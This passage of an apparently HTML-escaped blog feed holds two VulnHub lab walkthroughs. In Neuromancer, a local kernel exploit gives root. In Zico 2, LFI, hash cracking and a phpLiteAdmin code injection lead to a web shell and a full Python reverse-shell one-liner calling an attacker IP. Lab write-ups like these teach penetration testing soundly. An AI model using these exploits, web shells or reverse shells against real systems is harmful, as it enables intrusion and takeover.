Original     :: &amp;amp;gt&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;amp;#33&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;amp;#88&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;amp;#120&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;amp;#51&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;amp;#74&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;amp;#97&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;amp;#110&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;amp;#101&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;amp;#120&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;amp;#88&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;amp;#33&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;amp;lt&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
HTML DEcoded :: &lt;span class=&quot;o&quot;&gt;&amp;gt;!&lt;/span&gt;Xx3JanexX!&amp;lt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We change to the user lady3jane.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ta@neuromancer:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su - lady3jane
Password: 
lady3jane@neuromancer:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;custom-tomcat-chk.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We see a bash script in the home directory, I thought this script was being executed by a cron job, a way to escalate privileges, but it was not possible.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lady3jane@neuromancer:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;custom-tomcat-chk.sh 
&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Health check for Neuromancer (root) to execute every 3 minutes.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# ..the AI tells me it can maintain security, server health, etc w/o forced intervention,&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# but I beg to differ...hence the cron script.&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/tomcat_status.log

&lt;span class=&quot;nv&quot;&gt;health&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 5 &lt;span class=&quot;nt&quot;&gt;-Is&lt;/span&gt; 127.0.0.1:8080 |grep HTTP/1.1&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$health&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;200&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Tomcat is Up&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/tomcat_status.log
        &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Tomcat is down&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/tomcat_status.log
        &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;

lady3jane@neuromancer:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Another way is to find a kernel exploit.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ta@neuromancer:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ta&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ta&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ta&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,24&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cdrom&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,30&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dip&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,46&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;plugdev&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,110&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lxd&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,115&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lpadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,116&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sambashare&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

ta@neuromancer:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
Linux neuromancer 4.4.0-116-generic &lt;span class=&quot;c&quot;&gt;#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A possible kernel exploit for this version in the following.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit 4.4.0
&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--------------------------------&lt;/span&gt;
 Exploit Title                                                                 |  Path                         
&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--------------------------------&lt;/span&gt;
...
Linux Kernel &amp;lt; 4.4.0-116 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu 16.04.4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Local Privilege Escalation         | linux/local/44298.c
...
&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--------------------------------&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We copy the exploit to our current directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; linux/local/44298.c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We compile the exploit on the attacking machine since gcc is not installed on the victim machine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc 44298.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; exp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We transfer the exploit to the victim machine via SSH.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;scp &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; 34483 exp ta@192.168.56.104:exp  
 &lt;span class=&quot;nt&quot;&gt;----------------------------------------------------------------&lt;/span&gt;
|                Neuromancer Secure Remote Access                |
| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
 &lt;span class=&quot;nt&quot;&gt;----------------------------------------------------------------&lt;/span&gt;
Enter passphrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;key &lt;span class=&quot;s1&quot;&gt;'id_rsa'&lt;/span&gt;: 
exp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We grant execution privileges to the compiled exploit, execute it, and we get root.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ta@neuromancer:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;755 exp 
ta@neuromancer:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./exp 
task_struct &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ffff88000af43800
uidptr &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ffff88000c915484
spawning root shell
root@neuromancer:~# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root/
root@neuromancer:/root# &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;flag.txt  struts2  velocity.log
root@neuromancer:/root# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt 
be3306f431dae5ebc93eebb291f4914a
root@neuromancer:/root#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>s4rgaz</name></author><summary type="html">Description: A new OSCP style lab involving 2 vulnerable machines, themed after the cyberpunk classic Neuromancer a must read for any cyber-security enthusiast, this lab makes use of pivoting and post exploitation.</summary></entry><entry><title type="html">VulnHub - Zico 2</title><link href="http://localhost:4000/zico2.html" rel="alternate" type="text/html" title="VulnHub - Zico 2" /><published>2021-12-22T00:00:00-05:00</published><updated>2021-12-22T00:00:00-05:00</updated><id>http://localhost:4000/zico2</id><content type="html" xml:base="http://localhost:4000/zico2.html">&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt; A Boot2Root Machine intended to simulate a real world scenario&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; Rafael&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Operating System:&lt;/strong&gt; Linux&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Aim:&lt;/strong&gt; To get root and read the flag file.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/zico2-1,210/&quot;&gt;https://www.vulnhub.com/entry/zico2-1,210/&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h2&gt;
&lt;h3 id=&quot;host-discovery&quot;&gt;Host Discovery&lt;/h3&gt;

&lt;p&gt;A ping scan on the local network discovered the target host, the script you can find it &lt;a href=&quot;https://github.com/s4rgaz/hdiscovery.git&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hdiscovery.py &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 192.168.179.0/24
192.168.179.179 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; up
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h3&gt;

&lt;p&gt;The full TCP scan with nmap discovered four open ports.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 192.168.179.179 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; nmap/all-tcp-ports.txt
...
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
47159/tcp open  unknown
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;p&gt;In order to discover more information about the available services, an aggressive scan was performed with nmap.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80,111,47159 192.168.179.179 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/service-enum.txt
...
PORT      STATE SERVICE VERSION                                           
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:                                                      
|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;     
|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;         
|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   
80/tcp    open  http    Apache httpd 2.2.22 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;        
| http-methods:                                      
|_  Supported Methods: OPTIONS GET HEAD POST            
|_http-server-header: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;    
|_http-title: Zico&lt;span class=&quot;s1&quot;&gt;'s Shop                      
111/tcp   open  rpcbind 2-4 (RPC #100000)      
| rpcinfo:                                    
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33465/udp   status 
|   100024  1          40806/tcp6  status 
|   100024  1          47159/tcp   status 
|_  100024  1          60683/udp6  status 
47159/tcp open  status  1 (RPC #100024)
...
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h3&gt;

&lt;p&gt;In The web service we can see a shop web page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/zico2/screenshot-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Browsing I found that the &lt;strong&gt;page&lt;/strong&gt; parameter is including an HTML file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/zico2/screenshot-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By attempt to include the system password file was detected that is vulnerable to Local File Inclusion.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/zico2/screenshot-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A quick enumeration with dirb found the &lt;strong&gt;dbadmin&lt;/strong&gt; directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dirb http://192.168.179.179 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;
...
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Scanning URL: http://192.168.179.179/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+ http://192.168.179.179/cgi-bin/ &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:403|SIZE:291&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://192.168.179.179/css/          
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://192.168.179.179/dbadmin/      
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://192.168.179.179/img/        
+ http://192.168.179.179/index &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:7970&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
+ http://192.168.179.179/index.html &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:7970&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://192.168.179.179/js/             
+ http://192.168.179.179/LICENSE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:1094&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
+ http://192.168.179.179/package &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:789&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
+ http://192.168.179.179/server-status &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:403|SIZE:296&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ http://192.168.179.179/tools &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:8355&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://192.168.179.179/vendor/     
+ http://192.168.179.179/view &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We access this and find a link, and click on it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/zico2/screenshot-4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This contains a login form, we login entering &lt;strong&gt;admin&lt;/strong&gt; as password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/zico2/screenshot-5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/zico2/screenshot-6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By browsing, two users were found with their respective password hashes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/zico2/screenshot-7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We copy the password hashes to a file, and crack it with hashcat.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;96781A607F4E9F5F423AC01F0DAB0EBD&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;653F4B285089453FE00E2AAFAC573414&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; hashes.phplite
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;zcat /usr/share/wordlists/rockyou.txt.gz &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; rockyou.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hashcat &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0 hashes.phplite rockyou.txt
...
96781a607f4e9f5f423ac01f0dab0ebd:zico2215@
653f4b285089453fe00e2aafac573414:34kroot34 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In seconds hashcat managed to crack the MD5 hashes, with this credentials it was not possible to access to the server via SSH.&lt;/p&gt;

&lt;p&gt;A Remote Code Injection vulnerability was discovered for phpLiteAdmin 1.9.3.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit phpliteadmin 1.9.3                            
&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-------------------------&lt;/span&gt;
 Exploit Title                                             |  Path
&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-------------------------&lt;/span&gt;
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection             | php/webapps/24044.txt
&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-------------------------&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We copy the exploit to our current directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; php/webapps/24044.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
&lt;h3 id=&quot;remote-php-code-injection&quot;&gt;Remote PHP Code Injection&lt;/h3&gt;

&lt;p&gt;We follow the instructions described in the exploit.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;24044.txt
...
Proof of Concept:

1. We create a db named &lt;span class=&quot;s2&quot;&gt;&quot;hack.php&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Depending on Server configuration sometimes it will not work and the name &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the db will be &lt;span class=&quot;s2&quot;&gt;&quot;hack.sqlite&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Then simply try to rename the database / existing database to &lt;span class=&quot;s2&quot;&gt;&quot;hack.php&quot;&lt;/span&gt;.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
The script will store the sqlite database &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the same directory as phpliteadmin.php.
Preview: http://goo.gl/B5n9O
Hex preview: http://goo.gl/lJ5iQ

2. Now create a new table &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this database and insert a text field with the default value:
&amp;lt;?php phpinfo&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;?&amp;gt;
Hex preview: http://goo.gl/v7USQ

3. Now we run hack.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We create a database called &lt;strong&gt;hack.php&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/zico2/screenshot-8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We create a table called &lt;strong&gt;lite&lt;/strong&gt; that will contain a column called &lt;strong&gt;input&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/zico2/screenshot-9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/zico2/screenshot-10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We insert a web shell into the &lt;strong&gt;input&lt;/strong&gt; column.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/zico2/screenshot-11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using the LFI vulnerability we can include the &lt;strong&gt;hack.php&lt;/strong&gt; database, to execute the &lt;strong&gt;whoami&lt;/strong&gt; command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/zico2/screenshot-12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We need to set up a netcat listener on port 443, and run the following python reverse shell.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.179.1&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

